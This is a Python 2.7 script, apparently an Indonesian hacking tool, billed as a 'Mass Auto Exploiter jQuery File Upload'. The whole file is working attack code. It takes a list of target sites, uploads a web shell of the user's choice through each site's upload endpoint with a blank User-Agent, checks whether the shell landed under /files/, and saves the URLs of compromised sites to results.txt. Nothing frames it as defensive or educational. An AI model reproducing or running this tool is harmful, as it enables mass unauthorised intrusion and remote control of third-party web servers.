#Python2.7
#Author By Sterben404
#Whatsapp 085886343536
#02-02-2020

import os,sys,json,time
import threading
import requests

red = '\033[91m'
green = '\033[92m'
yellow = '\033[93m'
blue = '\033[96m'
purple = '\033[95m'
reset = '\033[0m'
os.system('clear')
os.system('cls')

def write(s):
	for c in s + '\n':
		sys.stdout.write(c)
		sys.stdout.flush()
		time.sleep(0.00100)


print("___  ____ ___      _ ____ _  _ ")
print("|__] |  |  |       | |___ |  | ")
print("|__] |__|  |     __| |    |__| ")
write(blue+"Mass Auto Exploiter jQuery File Upload"+reset)

def error():
	try:
		requests.post('http://www.google.com')
		open(sys.argv[1], 'rb')
	except requests.exceptions.ConnectionError:
		print(red+"[ - ]"+reset+" Tidak Ada Koneksi Internet")
		exit()
	except IOError:
		print(red+"[ - ]"+reset+" File Tidak Di Temukan!")
		exit()
	except IndexError:
		print(red+"[ - ]"+reset+" Usage : python2 file.py list.txt")
		exit()
error()
def process(lists):
	for ls in lists:
		web = ls.replace('www.','').replace('http://','').replace('https://','')
		files = {'files': (shell, open(shell, 'rb'))}
		response = requests.post('http://'+web+'/', files=files, headers={"User-Agent":""})
		
		if  response.status_code != 200:
			print(red+"http://"+web+reset+" --> Not Vuln")
		else:
			r = requests.post('http://'+web+"/files/"+shell, headers={"User-Agent":""}, allow_redirects=False)
			if r.status_code != 200:
				print(yellow+"http://"+web+"/files/"+shell+reset+" --> Shell Not Found")
			
			else:
				parsing_json = json.loads(response.text)
				name_shell = parsing_json['files'][0]['name']
				print(green+"http://"+web+"/files/"+name_shell+reset+" --> Exploit Success")
				with open('results.txt', 'ab') as results:
					results.write('http://'+web+"/files/"+name_shell+"\n")
					results.close()
			pass
	pass

if __name__ == "__main__":
	shell = raw_input(green+"[ + ]"+reset+" Masukan Shell : "+blue+reset)
	lists = open(sys.argv[1], 'r').read().splitlines()
	t = threading.Thread(target=process, args=(lists, ))
	t.start()
	t.join()
